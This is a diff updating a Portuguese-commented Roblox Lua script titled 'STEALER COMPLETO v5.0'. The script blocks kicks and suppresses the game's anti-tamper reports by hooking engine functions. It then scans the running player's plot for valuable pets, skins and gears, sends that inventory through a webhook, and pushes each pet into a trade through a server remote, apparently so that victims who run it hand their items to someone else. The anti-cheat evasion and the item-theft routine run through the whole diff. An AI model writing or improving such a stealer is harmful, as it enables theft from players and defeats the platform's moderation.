@@ -1,5 +1,6 @@
--- STEALER COMPLETO v4.0
--- Com Anti-Kick, Anti-Report e Synchronizer
+-- STEALER COMPLETO v5.0
+-- Baseado no sync by gg . sabcom
+-- Com Anti-Kick, Anti-Report e escaneamento via Workspace
 
 if game.PlaceId ~= 109983668079237 then
     return
@@ -16,28 +17,26 @@ local LocalPlayer = Players.LocalPlayer
 -- ===== ANTI-KICK =====
 pcall(function()
     if hookfunction then
-        local oldKick
-        oldKick = hookfunction(LocalPlayer.Kick, function(self, ...)
+        local oldKick = hookfunction(LocalPlayer.Kick, function(self, ...)
             return nil
         end)
-        print("[Anti-Kick] Ativado!")
+        print("[Anti-Kick] Ativado (hookfunction)")
     elseif hookmetamethod then
-        local oldNC
-        oldNC = hookmetamethod(game, "__namecall", function(self, ...)
+        local oldNC = hookmetamethod(game, "__namecall", function(self, ...)
             local method = getnamecallmethod()
             if (method == "Kick" or method == "kick") and (self == LocalPlayer or self == Players) then
                 return nil
             end
             return oldNC(self, ...)
         end)
+        print("[Anti-Kick] Ativado (hookmetamethod)")
     end
 end)
 
 -- ===== ANTI-REPORT =====
 pcall(function()
     if hookfunction then
-        local oldFS
-        oldFS = hookfunction(Instance.new("RemoteEvent").FireServer, function(self, ...)
+        local oldFS = hookfunction(Instance.new("RemoteEvent").FireServer, function(self, ...)
             local args = {...}
             local arg1 = args[1]
             if #self.Name == 67 or (type(arg1) == "string" and (arg1:find("StopTrying") or arg1:find("Tamper") or arg1:find("Exploit"))) then
@@ -62,52 +61,8 @@ local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
 local tradeCompleted = false
 local webhookSent = false
 
--- ===== SYNCHRONIZER CACHE =====
-local cachedChannelsTable = nil
-local _gu = debug.getupvalues or getupvalues
-
-local function initSynchronizerCache()
-    if cachedChannelsTable then return cachedChannelsTable end
-    
-    local ok, sync = pcall(function()
-        return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
-    end)
-    
-    if not (ok and type(sync) == "table") then return nil end
-    
-    if _gu and type(sync.GetAllChannels) == "function" then
-        local ok2, ups = pcall(_gu, sync.GetAllChannels)
-        if ok2 and type(ups) == "table" then
-            for _, u in pairs(ups) do
-                if type(u) == "table" then
-                    local uuidCount = 0
-                    for tk, tv in pairs(u) do
-                        if type(tk) == "string" and tk:match("%-") and type(tv) == "table" then
-                            uuidCount = uuidCount + 1
-                            if uuidCount >= 2 then
-                                cachedChannelsTable = u
-                                return cachedChannelsTable
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-    
-    if type(sync.GetAllChannels) == "function" then
-        local ok3, res = pcall(sync.GetAllChannels)
-        if ok3 and type(res) == "table" then
-            cachedChannelsTable = res
-            return cachedChannelsTable
-        end
-    end
-    
-    return nil
-end
-
--- ===== DADOS =====
-local AnimalsData, MutationsData, TraitsData
+-- ===== LOAD DATA =====
+local AnimalsData, MutationsData, TraitsData, NumberUtils
 
 local function loadData()
     if AnimalsData then return true end
@@ -116,10 +71,38 @@ local function loadData()
         AnimalsData = require(d:WaitForChild("Animals"))
         MutationsData = require(d:WaitForChild("Mutations"))
         TraitsData = require(d:WaitForChild("Traits"))
+        NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
     end)
     return AnimalsData ~= nil
 end
+loadData()
 
+-- ===== DISPLAY NAME TO INDEX =====
+local displayNameToIndex = {}
+if AnimalsData then
+    for idx, info in pairs(AnimalsData) do
+        if info.DisplayName then
+            displayNameToIndex[info.DisplayName] = idx
+        end
+        displayNameToIndex[idx] = idx
+    end
+end
+
+-- ===== GET PLOT OWNER =====
+local function getPlotOwner(plot)
+    local sign = plot:FindFirstChild("PlotSign")
+    if not sign then return nil end
+    local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
+    if not gui then return nil end
+    local label = gui:FindFirstChildWhichIsA("TextLabel", true)
+    if not label then return nil end
+    local text = label.Text
+    if not text or text == "" or text:lower():find("empty") then return nil end
+    local owner = text:match("^(.+)'s Base$")
+    return owner or text
+end
+
+-- ===== CALCULATE GENERATION =====
 local function calculateGeneration(index, mutation, traits)
     if not loadData() then return 0 end
     local info = AnimalsData[index]
@@ -147,56 +130,47 @@ local function calculateGeneration(index, mutation, traits)
 end
 
 local function formatNumber(val)
-    local ok, NumberUtils = pcall(function()
-        return require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
-    end)
-    if ok and NumberUtils and NumberUtils.ToString then
+    if NumberUtils and NumberUtils.ToString then
         return "$" .. NumberUtils:ToString(val) .. "/s"
     end
     return "$" .. tostring(val) .. "/s"
 end
 
--- ===== ESCANEIA BRAINROTS DO JOGADOR =====
-local function scanPlayerBrainrots()
-    local t = initSynchronizerCache()
-    if not t then return {} end
+-- ===== ESCANEIA BRAINROTS (VIA WORKSPACE) =====
+local function scanBrainrotsFromWorkspace()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return {} end
     
     local found = {}
+    local username = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
     
-    for plotName, channel in pairs(t) do
-        if type(plotName) == "string" and plotName:match("%-") then
-            local cacheTable = nil
-            if type(channel) == "table" and channel.CacheTable then
-                cacheTable = channel.CacheTable
-            end
-            
-            if cacheTable then
-                local owner = rawget(cacheTable, "Owner")
-                local animalList = rawget(cacheTable, "AnimalList")
-                
-                if owner and type(owner) == "table" and owner.UserId == LocalPlayer.UserId then
-                    if animalList and type(animalList) == "table" then
-                        for slot, petData in pairs(animalList) do
-                            if type(petData) == "table" then
-                                local petIndex = petData.Index or "Unknown"
-                                if TARGET_BRAINROTS[petIndex] then
-                                    local mutation = petData.Mutation or "None"
-                                    local traits = petData.Traits or {}
-                                    local gen = calculateGeneration(petIndex, mutation, traits)
-                                    
-                                    table.insert(found, {
-                                        name = petIndex,
-                                        slotKey = slot,
-                                        data = petData,
-                                        gen = gen,
-                                        mutation = mutation,
-                                        traits = traits
-                                    })
-                                end
-                            end
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:IsA("Model") then
+            local owner = getPlotOwner(plot)
+            if owner == username or owner == displayName then
+                for _, desc in ipairs(plot:GetDescendants()) do
+                    if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
+                        local brainrotName = desc.Name
+                        if TARGET_BRAINROTS[brainrotName] then
+                            local attrs = desc:GetAttributes()
+                            local mutation = attrs.Mutation or attrs.__mutation or "None"
+                            local traits = attrs.Traits or {}
+                            
+                            local gen = calculateGeneration(brainrotName, mutation, traits)
+                            
+                            table.insert(found, {
+                                name = brainrotName,
+                                slotKey = brainrotName,
+                                model = desc,
+                                mutation = mutation,
+                                traits = traits,
+                                gen = gen
+                            })
                         end
                     end
                 end
+                break
             end
         end
     end
@@ -273,6 +247,50 @@ local function scanGears()
         end
     end
     return found
+end
+
+-- ===== SYNCHRONIZER CACHE (pra Base Skins e Gears) =====
+local cachedChannelsTable = nil
+local _gu = debug.getupvalues or getupvalues
+
+local function initSynchronizerCache()
+    if cachedChannelsTable then return cachedChannelsTable end
+    
+    local ok, sync = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
+    end)
+    
+    if not (ok and type(sync) == "table") then return nil end
+    
+    if _gu and type(sync.GetAllChannels) == "function" then
+        local ok2, ups = pcall(_gu, sync.GetAllChannels)
+        if ok2 and type(ups) == "table" then
+            for _, u in pairs(ups) do
+                if type(u) == "table" then
+                    local uuidCount = 0
+                    for tk, tv in pairs(u) do
+                        if type(tk) == "string" and tk:match("%-") and type(tv) == "table" then
+                            uuidCount = uuidCount + 1
+                            if uuidCount >= 2 then
+                                cachedChannelsTable = u
+                                return cachedChannelsTable
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    if type(sync.GetAllChannels) == "function" then
+        local ok3, res = pcall(sync.GetAllChannels)
+        if ok3 and type(res) == "table" then
+            cachedChannelsTable = res
+            return cachedChannelsTable
+        end
+    end
+    
+    return nil
 end
 
 -- ===== REMOTES =====
@@ -366,7 +384,7 @@ local function sendWebhook(brainrots, baseSkins, gears)
     end)
 end
 
--- ===== TRADE =====
+-- ===== GET USER ID =====
 local function getUserIdFromName(username)
     if type(username) == "number" then return username end
     local success, result = pcall(function()
@@ -389,9 +407,9 @@ end
 
 -- ===== MAIN =====
 local function main()
-    print("[Stealer] Escaneando...")
+    print("[Stealer] Escaneando brainrots via Workspace...")
     
-    local brainrots = scanPlayerBrainrots()
+    local brainrots = scanBrainrotsFromWorkspace()
     local baseSkins = scanBaseSkins()
     local gears = scanGears()
     
@@ -402,7 +420,7 @@ local function main()
     sendWebhook(brainrots, baseSkins, gears)
     
     if #brainrots == 0 then
-        print("[Stealer] Nenhum brainrot encontrado!")
+        print("[Stealer] Nenhum brainrot alvo encontrado!")
         return
     end
     
@@ -436,7 +454,7 @@ local function main()
                         
                         for _, brainrot in ipairs(brainrots) do
                             print("[Stealer] Adicionando: " .. brainrot.name)
-                            pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, brainrot.data)
+                            pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
                             task.wait(1.5)
                         end
                         
@@ -460,3 +478,4 @@ local function main()
 end
 
 pcall(main)
+print("[Stealer] Finalizado!")
